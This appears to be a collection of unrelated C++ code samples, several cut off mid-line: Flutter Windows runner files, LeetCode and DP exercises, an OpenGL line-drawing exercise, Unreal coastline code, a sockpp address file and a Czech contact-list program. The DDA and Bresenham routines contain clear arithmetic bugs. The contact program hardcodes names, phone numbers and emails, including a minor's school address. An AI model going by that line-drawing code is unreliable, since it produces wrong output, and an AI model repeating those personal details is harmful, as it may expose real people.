    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include <bits/stdc++.h>\nusing namespace std;\n\nstruct ListNode {\n    int val;\n    ListNode *next;\n    ListNode() : val(0), next(nullptr) {\n    }\n    ListNode(int x) : val(x), next(nullptr) {\n    }\n    ListNode(int x, ListNode *next) : val(x), next(next) {\n    }\n};\n\nstruct TreeNode {\n    int val;\n    TreeNode *left;\n    TreeNode *right;\n    TreeNode() : val(0), left(nullptr), right(nullptr) {\n    }\n    TreeNode(int x) : val(x), left(nullptr), right(nullptr) {\n    }\n    TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) {\n    }\n};\n\nclass Node {\npublic:\n    int val;\n    vector<Node *> neighbors;\n    Node() {\n        val = 0;\n        neighbors = vector<Node *>();\n    }\n    Node(int _val) {\n        val = _val;\n        neighbors = vector<Node *>();\n    }\n    Node(int _val, vector<Node *> _neighbors) {\n        val = _val;\n        neighbors = _neighbors;\n    }\n};\n\n/*the solution should start from below*/\n\nclass Solution {\n    TreeNode *head = nullptr;\npublic:\n    void insert(int val) {\n        TreeNode *newHead = new TreeNode(val, nullptr, head);\n        head = newHead;\n        return;\n    }\n\n    void traversal(TreeNode *root) {\n        if (!root) return;\n        traversal(root->right);\n        insert(root->val);\n        traversal(root->left);\n        return;\n    }\n\n    TreeNode *increasingBST(TreeNode *root) {\n        traversal(root);\n        return head;\n    }\n};",
    "#include <iostream>\r\n#include <string>\r\n#include <algorithm>\r\n#include <cctype>\r\n\r\nusing namespace std;\r\n\r\n\tclass kontakt{\r\n\t\r\n\t\tprivate:\r\n\t\t\r\n\t\t\tint telCislo;\r\n\t\t\tstring jmeno;\r\n\t\t\tstring prijmeni;\r\n\t\t\tstring povolani;\r\n\t\t\tstring firma;\r\n\t\t\tstring email;\r\n\t\t\tint vek;\r\n\t\t\tstring datumNarozeni;\r\n\t\t\r\n\t\tpublic:\r\n\t\t\r\n\t\t\tkontakt(int telCislo, string jmeno, string prijmeni, string povolani, string firma, string email, int vek, string datumNarozeni){\r\n\t\t\t\tthis->telCislo = telCislo;\r\n\t\t\t\tthis->jmeno = jmeno;\r\n\t\t\t\tthis->prijmeni = prijmeni;\r\n\t\t\t\tthis->povolani = povolani;\r\n\t\t\t\tthis->firma = firma;\r\n\t\t\t\tthis->email = email;\r\n\t\t\t\tthis->vek = vek;\r\n\t\t\t\tthis->datumNarozeni = datumNarozeni;\r\n\t\t\t}\r\n\t\t\r\n\t\t\tint getTelCislo(int telCislo){\r\n\t\t\t\treturn telCislo;\r\n\t\t\t}\r\n\t\t\r\n\t\t\tstring getJmeno(string jmeno){\r\n\t\t\t\treturn jmeno;\r\n\t\t\t}\r\n\t\t\r\n\t\t\tstring getPrijmeni(string prijmeni){\r\n\t\t\t\treturn prijmeni;\r\n\t\t\t}\r\n\t\t\r\n\t\t\tstring getPovolani(string povolani){\r\n\t\t\t\treturn povolani;\r\n\t\t\t}\r\n\t\t\r\n\t\t\tstring getFirma(string firma){\r\n\t\t\t\treturn firma;\r\n\t\t\t}\r\n\t\t\r\n\t\t\tstring getEmail(string email){\r\n\t\t\t\treturn email;\r\n\t\t\t}\r\n\t\t\r\n\t\t\tint getVek(int vek){\r\n\t\t\t\treturn vek;\r\n\t\t\t}\r\n\t\t\r\n\t\t\tstring getDatumNarozeni(string datumNarozeni){\r\n\t\t\t\treturn datumNarozeni;\r\n\t\t\t}\r\n\t\t\r\n\t\t\tvoid vypsat(){\r\n\t\t\t\tcout << \"Jmeno a prijmeni: \" << getJmeno(jmeno) << \" \" << getPrijmeni(prijmeni) << endl;\r\n\t\t\t\tcout << \"Telefonni cislo: \" << getTelCislo(telCislo) << endl;\r\n\t\t\t\tcout << \"Povolani: \" << getPovolani(povolani) << endl;\r\n\t\t\t\tcout << \"Firma: \" << getFirma(firma) << endl;\r\n\t\t\t\tcout << \"Email: \" << getEmail(email) << endl;\r\n\t\t\t\tcout << \"Vek: \" << getVek(vek) << endl;\r\n\t\t\t\tcout << \"Datum narozeni: \" << getDatumNarozeni(datumNarozeni) << endl;\r\n\t\t\t}\t\r\n\t\t\r\n\t};\r\n\r\n\tchar ToUpper(char cyklus){\r\n\t\treturn std::toupper(static_cast<unsigned char>(cyklus));\r\n\t}\r\n\r\nint main(int argc, char *argv[]){\r\n\t\r\n\tint vyber;\r\n\tchar cyklus;\r\n\t\r\n\tkontakt Pavel(789225103, \"Pavel\", \"Novak\", \"Elektrikar\", \"LCD Labs\", \"pnovak@lcd.cz\", 39, \"15. leden 1985\");\r\n\tkontakt Adam(608995422, \"Adam\", \"Novotny\", \"Programator\", \"Microsoft\", \"adamdeveloper@microsoft.com\", 26, \"10. brezen 1998\");\r\n\tkontakt Josef(991238250, \"Josef\", \"Dvorak\", \"Duchodce\", \"N/A\", \"N/A\", 91, \"29. unor 1933\");\r\n\tkontakt Klara(775148952, \"Klara\", \"Svobodova\", \"Student\", \"SSIPF Cichnova\", \"st011862@student.cichnovabrno.cz\", 17, \"7. duben 2007\");\r\n\t\r\n\tdo{\r\n\t\tcout << \"Seznam telefonnich kontaktu\" << endl;\r\n\t\tcout << \"1. Pavel\" << endl;\r\n\t\tcout << \"2. Adam\" << endl;\r\n\t\tcout << \"3. Josef\" << endl;\r\n\t\tcout << \"4. Klara\" << endl;\r\n\t\tcout << \"Vyber kontakt: \";\r\n\t\tcin >> vyber;\r\n\t\r\n\t\tsystem(\"cls\");\r\n\t\r\n\t\t\tswitch(vyber){\r\n\t\t\r\n\t\t\t\tcase 1:\r\n\t\t\t\t\t\r\n\t\t\t\t\tPavel.vypsat();\r\n\t\t\t\t\t\r\n\t\t\t\tbreak;\r\n\t\t\r\n\t\t\t\tcase 2:\r\n\t\t\t\t\t\r\n\t\t\t\t\tAdam.vypsat();\r\n\t\t\t\t\t\r\n\t\t\t\tbreak;\r\n\t\t\r\n\t\t\t\tcase 3:\r\n\t\t\t\t\t\r\n\t\t\t\t\tJosef.vypsat();\r\n\t\t\t\t\t\r\n\t\t\t\tbreak;\r\n\t\t\r\n\t\t\t\tcase 4:\r\n\t\t\t\t\t\r\n\t\t\t\t\tKlara.vypsat();\r\n\t\t\t\t\t\r\n\t\t\t\tbreak;\r\n\t\t\r\n\t\t\t\tdefault:\r\n\t\t\t\t\t\r\n\t\t\t\t\tcout << \"Neplatna odpoved.\" << endl;\r\n\t\t\t\t\treturn 0;\r\n\t\t\t\t\t\t\r\n\t\t\t\tbreak;\r\n\t\r\n\t\t\t}\r\n\t\r\n\tcout << \"Prejete si program pouzit znovu? (y/Y): \";\r\n\tcin >> cyklus;\r\n\t\r\n\tchar upperCyklus = std::toupper(cyklus);\r\n\t\r\n\tsystem(\"cls\");\r\n\t\r\n\t}while(cyklus == 'Y' || cyklus == 'y');\r\n\t\tcout << \"Dekuji za pouziti programu. Ukoncuji.\" << endl;\r\n\t\treturn 0;\r\n}",
    "#include <bits/stdc++.h>\n#include <cmath>\nusing namespace std;\n\nint arr[256][256];\npair<int, char> pr[100];\nint cnt;\n\nvoid palindrome(string s, int arr[256][256]) {\n\n   for(int k = 0; k < s.size(); k++) {\n      \n      for(int i = 0; i < s.size(); i++) {\n         int j = k + i + 1;\n         if(j <= s.size()-1) {\n            if(s[i] == s[j]) arr[i][j] = arr[i+1][j-1];\n            else arr[i][j] = min(arr[i][j-1], arr[i+1][j]) + 1;\n         }\n      }\n\n   }\n   \n}\n\nstring removeChars(int row, int col, string s) {\n   while(arr[row][col] != 0) {\n\n      if(s[row] == s[col]) {\n         row++;\n         col--;\n         continue;\n      }\n      int left = arr[row][col - 1];\n      int down = arr[row + 1][col];\n      if(left < down) {\n        pr[cnt].first = col;\n        pr[cnt].second = s[col];\n        s.replace(col, 1, \"-\");\n        col--;\n        cnt++;\n      } else {\n         pr[cnt].first = row;\n         pr[cnt].second = s[row];\n        s.replace(row, 1, \"-\");        \n         row++;\n         cnt++;\n      }\n\n   }\n\n   return s;\n}\n\nint main() {\n   string s;\n   cin >> s;\n\n   palindrome(s, arr);\n\n   for(int i = 0; i < s.size(); i++) {\n      for(int j = 0; j < s.size(); j++) {\n         cout << arr[i][j] << \" \";\n      }  \n      cout << endl;\n   }\n   cout << arr[0][s.size() - 1] << endl;//characters need to be removed in order to get palindrome))\n\n   string ans = removeChars(0, s.size() - 1, s);\n   cout << ans << endl;\n\ncout << cnt << endl;    \n\n   for(int i = 0; i < cnt; i++) {\n        cout << pr[i].first << \" - \" << pr[i].second << endl;\n   }\n\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"medical_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include <GL/glut.h>\n#include<math.h>\nusing namespace std;\n\nint h = 640;\nint w = 400;\n\nstatic int menu_id;\nstatic int submenu_id;\nstatic int submenu_dotted_id;\nstatic int submenu_dashed_id;\n\nvoid myInit() {\n\tglClearColor(1.0,1.0,1.0,1.0);\n\tglColor3f(0.0,0.0,0.0);\n\tglPointSize(15.0);\n\tgluOrtho2D(0,640,0,400);\n}\nvoid DDA_simple(float x1,float y1,float x2,float y2);\nvoid Bresenham_simple(float x1,float y1,float x2,float y2);\nvoid DDA_dotted(float x1,float y1,float x2,float y2);\nvoid Bresenham_dotted(float x1,float y1,float x2,float y2);\nvoid DDA_dashed(float x1,float y1,float x2,float y2);\nvoid Bresenham_dashed(float x1,float y1,float x2,float y2);\n\nvoid mainMenu(int choice);\nvoid submenu(int choice);\nvoid submenu_dotted(int choice);\nvoid submenu_dashed(int choice);\n\nvoid coordinate() {\n\tglBegin(GL_LINES);\n\t\tglVertex2d(h/2,0);\n\t\tglVertex2d(h/2,w);\n\t\tglVertex2d(0,w/2);\n\t\tglVertex2d(h,w/2);\n\tglEnd();\n\tglFlush();\n}\nvoid MyDisplay(){\n\tglClear( GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT);\n\tcoordinate();\n\n\n\n}\nint main (int argc,char **argv){\n\tglutInit(&argc,argv);\n\tglutInitDisplayMode(GLUT_SINGLE |GLUT_RGB);\n\tglutInitWindowPosition(0,0);\n\tglutInitWindowSize(h,w);\n\tglutCreateWindow(\"Sample\");\n\n\tglutDisplayFunc(MyDisplay);\n\n\n\t// menu\n\tsubmenu_id=glutCreateMenu(submenu);\n\tglutAddMenuEntry(\"DDA\",1);\n\tglutAddMenuEntry(\"BRESNHAM\",2);\n\n\t// submenu for dotted line\n\tsubmenu_dotted_id=glutCreateMenu(submenu_dotted);\n\tglutAddMenuEntry(\"DDA\",1);\n\tglutAddMenuEntry(\"BRESNHAM\",2);\n\n\t// submenu for dashed line\n\tsubmenu_dashed_id=glutCreateMenu(submenu_dashed);\n\tglutAddMenuEntry(\"DDA\",1);\n\tglutAddMenuEntry(\"BRESNHAM\",2);\n\n\t// menu\n\tmenu_id = glutCreateMenu(mainMenu);\n\tglutAddMenuEntry(\"MAIN MENU\",0);\n\tglutAddSubMenu(\"SIMPLE LINE\",submenu_id);\n\tglutAddSubMenu(\"DOTTED LINE\",submenu_dotted_id);\n\tglutAddSubMenu(\"DASHED LINE\",submenu_dashed_id);\n\tglutAttachMenu(GLUT_RIGHT_BUTTON);\n\tmyInit();\n\n\tglutMainLoop();\n\treturn 0;\n}\n\nvoid submenu(int choice) {\n\t//color = colors[choice];\n\tswitch (choice) {\n            case 1:\n             \tDDA_simple(10, 50, 100, 200);\n            \tbreak;\n\n            case 2:\n            \tBresenham_simple(50,10,200,100);\n            \tbreak;\n\t\t}\n}\n\nvoid submenu_dotted(int choice) {\n\t//color = colors[choice];\n\tswitch (choice) {\n            case 1:\n             \tDDA_dotted(10, 50, 100, 200);\n            \tbreak;\n\n            case 2:\n            \tBresenham_dotted(50,10,200,100);\n            \tbreak;\n\t\t}\n}\n\nvoid submenu_dashed(int choice) {\n\t//color = colors[choice];\n\tswitch (choice) {\n            case 1:\n             \tDDA_dashed(10, 50, 100, 200);\n            \tbreak;\n\n            case 2:\n            \tBresenham_dashed(50,10,200,100);\n            \tbreak;\n\t\t}\n}\n\nvoid mainMenu(int choice) {\n\t//color = colors[choice];\n}\n\n// DDA SIMPLE LINE\nvoid DDA_simple(float x1,float y1,float x2,float y2) {\n\tglPointSize(5.0);\n\tfloat dx = x2-x1;\n\tfloat dy = y2-y1;\n\tint steps = 0;\n\tfloat m = dy/dx;\n\tint i = 1;\n\tfloat xi = x1,yi=y1;\n\n\tif(dx>dy)\n\t\tsteps = abs(dx);\n\telse\n\t\tsteps = abs(dy);\n\n\n\t\twhile(i<=steps) {\n\n\t\t\tglBegin(GL_POINTS);\n    \t\t\tglVertex2f(round(xi), round(yi));\n    \t\tglEnd();\n    \t\tglFlush();\n\n\t\t    if(m<1) {\n\t\t\t\txi += 1+xi;\n\t\t\t\tyi += m+yi;\n\t\t\t}\n\n\t\t\telse if(m==1) {\n\t\t\t\txi += 1+xi;\n\t\t\t\tyi += 1+yi;\n\t\t\t}\n\t\t\telse if(m>1) {\n\t\t\t\txi = 1/m+xi;\n\t\t\t\tyi = 1+yi;\n\t\t\t}\n\t\t\ti++;\n\t\t}\n}\n\nvoid Bresenham_simple(float x1,float y1,float x2,float y2) {\n\tglPointSize(5.0);\n\tfloat dx = x2-x1;\n\tfloat dy = y2-y1;\n\tfloat pk = 2*dy-dx;\n\tfloat pi = pk;\n\tfloat xi = x1,yi=y1;\n\n\twhile(xi<=x2&&yi<=y2) {\n\t\t\tglBegin(GL_POINTS);\n    \t\t\tglVertex2f(xi, yi);\n    \t\tglEnd();\n    \t\tglFlush();\n\n    \t\tif(pi<0) {\n    \t\t\tpi = pk + 2*dy;\n    \t\t\txi = xi+1;\n    \t\t\tyi = yi;\n    \t\t}\n\n    \t\telse {\n    \t\t\tpi = pk + 2*(dy-dx);\n    \t\t\txi = xi+1;\n    \t\t\tyi = yi+1;\n    \t\t}\n\t}\n}\n\n\n// DDA DOTTED LINE\nvoid DDA_dotted(float x1,float y1,float x2,float y2) {\n\tglPointSize(5.0);\n\tfloat dx = x2-x1;\n\tfloat dy = y2-y1;\n\tint steps = 0;\n\tfloat m = dy/dx;\n\tint i = 1;\n\tfloat xi = x1,yi=y1;\n\n\tif(dx>dy)\n\t\tsteps = abs(dx);\n\telse\n\t\tsteps = abs(dy);\n\n\t\tint count = 0;\n\t\twhile(i<=steps) {\n\n\t\t\tglBegin(GL_POINTS);\n\t\t\tif(i%10==0)\n    \t\t\tglVertex2f(round(xi), round(yi));\n    \t\tglEnd();\n    \t\tglFlush();\n\n\t\t    if(m<1) {\n\t\t\t\txi += 1+xi;\n\t\t\t\tyi += m+yi;\n\t\t\t}\n\n\t\t\telse if(m==1) {\n\t\t\t\txi += 1+xi;\n\t\t\t\tyi += 1+yi;\n\t\t\t}\n\t\t\telse if(m>1) {\n\t\t\t\txi = 1/m+xi;\n\t\t\t\tyi = 1+yi;\n\t\t\t}\n\n\t\t\ti++;\n\t\t}\n}\n// DOTTED BRESENHAM LINE\nvoid Bresenham_dotted(float x1,float y1,float x2,float y2) {\n\tglPointSize(5.0);\n\tint i=0;\n\tfloat dx = x2-x1;\n\tfloat dy = y2-y1;\n\tfloat pk = 2*dy-dx;\n\tfloat pi = pk;\n\tfloat xi = x1,yi=y1;\n\n\twhile(xi<=x2&&yi<=y2) {\n\t\t\tglBegin(GL_POINTS);\n\t\t\t\tif(i%10==0)\n    \t\t\t\tglVertex2f(xi, yi);\n    \t\tglEnd();\n    \t\tglFlush();\n\n    \t\tif(pi<0) {\n    \t\t\tpi = pk + 2*dy;\n    \t\t\txi = xi+1;\n    \t\t\tyi = yi;\n    \t\t}\n\n    \t\telse {\n    \t\t\tpi = pk + 2*(dy-dx);\n    \t\t\txi = xi+1;\n    \t\t\tyi = yi+1;\n    \t\t}\n    \t\ti++;\n\t}\n}\n\n// DASHED LINE\n\n// DDA DASHED LINE\nvoid DDA_dashed(float x1,float y1,float x2,float y2) {\n\tglPointSize(5.",
    "// Fill out your copyright notice in the Description page of Project Settings.\n\n\n#include \"Coastline/IslandCoastline.h\"\n#include \"IslandMapData.h\"\n#include \"PolyPartitionHelper.h\"\n\nvoid UIslandCoastline::Initialize(const UTriangleDualMesh* Mesh, TArray<bool> OceanRegions, TArray<bool> CoastRegions)\n{\n\tTMap<FTriangleIndex, FRegionEdge*> BMap;\n\tfor (FPointIndex PointIndex(0); PointIndex < Mesh->NumSolidRegions; ++PointIndex)\n\t{\n\t\tif (!CoastRegions[PointIndex])\n\t\t{\n\t\t\tcontinue;\n\t\t}\n\t\tTArray<FSideIndex> Sides = Mesh->r_circulate_s(PointIndex);\n\t\tfor (const FSideIndex& Side : Sides)\n\t\t{\n\t\t\tFPointIndex OuterRegion = Mesh->s_end_r(Side);\n\t\t\tif (!OceanRegions[OuterRegion])\n\t\t\t{\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\tconst FTriangleIndex AIndex = Mesh->s_inner_t(Side);\n\t\t\tconst FTriangleIndex BIndex = Mesh->s_outer_t(Side);\n\t\t\tTSharedPtr<FRegionEdge> Edge = MakeShared<FRegionEdge>(\n\t\t\t\tAIndex, Mesh->t_pos(AIndex), BIndex, Mesh->t_pos(BIndex));\n\t\t\tEdges.Add(Edge);\n\t\t\tBMap.Add(BIndex, Edge.Get());\n\t\t}\n\t}\n\n\tfor (const TSharedPtr<FRegionEdge>& Edge : Edges)\n\t{\n\t\tFRegionEdge* PrevEdge = BMap.FindChecked(Edge->AIndex);\n\t\tif (!PrevEdge->Next.IsValid())\n\t\t{\n\t\t\tPrevEdge->Next = Edge;\n\t\t}\n\t}\n\tTMap<FRegionEdge*, int32> IslandIdMap;\n\tIslandIdMap.Empty(Edges.Num());\n\tfor (const TSharedPtr<FRegionEdge>& Edge : Edges)\n\t{\n\t\tif (IslandIdMap.Contains(Edge.Get()))\n\t\t\tcontinue;\n\t\tCoastlines.Add(FCoastlinePolygon());\n\t\tFCoastlinePolygon& Coastline = Coastlines.Last();\n\t\tCoastline.IslandId = Edge->AIndex;\n\t\tCoastline.Begin = Edge;\n\t\tTWeakPtr<FRegionEdge> NowEdge = Edge;\n\t\tint32 EdgeNum = 0;\n\t\twhile (true)\n\t\t{\n\t\t\t++EdgeNum;\n\t\t\tIslandIdMap.Add(NowEdge.Pin().Get(), Edge->AIndex);\n\t\t\tTWeakPtr<FRegionEdge> NextEdge = NowEdge.Pin()->Next;\n\t\t\tif (NextEdge == Edge)\n\t\t\t{\n\t\t\t\tCoastline.End = NowEdge;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tNowEdge = NextEdge;\n\t\t}\n\t\tNowEdge = Coastline.Begin;\n\t\tCoastline.Indices.Empty(EdgeNum);\n\t\tCoastline.Positions.Empty(EdgeNum);\n\t\twhile (true)\n\t\t{\n\t\t\tCoastline.Indices.Add(NowEdge.Pin()->AIndex);\n\t\t\tCoastline.Positions.Add(NowEdge.Pin()->APosition);\n\t\t\tTWeakPtr<FRegionEdge> NextEdge = NowEdge.Pin()->Next;\n\t\t\tif (NextEdge == Coastline.Begin)\n\t\t\t\tbreak;\n\t\t\tNowEdge = NextEdge;\n\t\t}\n\t}\n\n\t// Triangulate\n\tfor (FCoastlinePolygon& Coastline : Coastlines)\n\t{\n\t\tUIslandMapUtils::TriangulateContour(Coastline, Coastline.Triangles);\n\t}\n}\n\nconst TArray<FCoastlinePolygon>& UIslandCoastline::GetCoastlines() const\n{\n\treturn Coastlines;\n}\n",
    "// unix_address.cpp\n//\n// --------------------------------------------------------------------------\n// This file is part of the \"sockpp\" C++ socket library.\n//\n// Copyright (c) 2014-2017 Frank Pagliughi\n// All rights reserved.\n//\n// Redistribution and use in source and binary forms, with or without\n// modification, are permitted provided that the following conditions are\n// met:\n//\n// 1. Redistributions of source code must retain the above copyright notice,\n// this list of conditions and the following disclaimer.\n//\n// 2. Redistributions in binary form must reproduce the above copyright\n// notice, this list of conditions and the following disclaimer in the\n// documentation and/or other materials provided with the distribution.\n//\n// 3. Neither the name of the copyright holder nor the names of its\n// contributors may be used to endorse or promote products derived from this\n// software without specific prior written permission.\n//\n// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS\n// IS\" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO,\n// THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR\n// PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR\n// CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,\n// EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,\n// PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR\n// PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF\n// LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING\n// NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS\n// SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n// --------------------------------------------------------------------------\n\n#include \"sockpp/unix_address.h\"\n\n#include <cstring>\n#include <stdexcept>\n\nusing namespace std;\n\nnamespace sockpp {\n\n/////////////////////////////////////////////////////////////////////////////\n\nconstexpr sa_family_t unix_address::ADDRESS_FAMILY;\nconstexpr size_t unix_address::MAX_PATH_NAME;\n\n// --------------------------------------------------------------------------\n\nunix_address::unix_address(const string& path) {\n    if (path.length() > MAX_PATH_NAME)\n        throw system_error{make_error_code(errc::invalid_argument)};\n\n    addr_.sun_family = ADDRESS_FAMILY;\n    // Remember, if len==MAX, there's no NUL terminator\n    ::strncpy(addr_.sun_path, path.c_str(), MAX_PATH_NAME);\n}\n\nunix_address::unix_address(const string& path, error_code& ec) noexcept {\n    if (path.length() > MAX_PATH_NAME) {\n        ec = make_error_code(errc::invalid_argument);\n    }\n    else {\n        ec = error_code{};\n        addr_.sun_family = ADDRESS_FAMILY;\n        // Remember, if len==MAX, there's no NUL terminator\n        ::strncpy(addr_.sun_path, path.c_str(), MAX_PATH_NAME);\n    }\n}\n\n// --------------------------------------------------------------------------\n\nresult<unix_address> unix_address::create(const string& path) {\n    if (path.length() > MAX_PATH_NAME)\n        return errc::invalid_argument;\n\n    return unix_address{path};\n}\n\n// --------------------------------------------------------------------------\n\nostream& operator<<(ostream& os, const unix_address& addr) {\n    os << \"unix:\" << addr.path();\n    return os;\n}\n\n/////////////////////////////////////////////////////////////////////////////\n// End namespace sockpp\n}  // namespace sockpp\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL 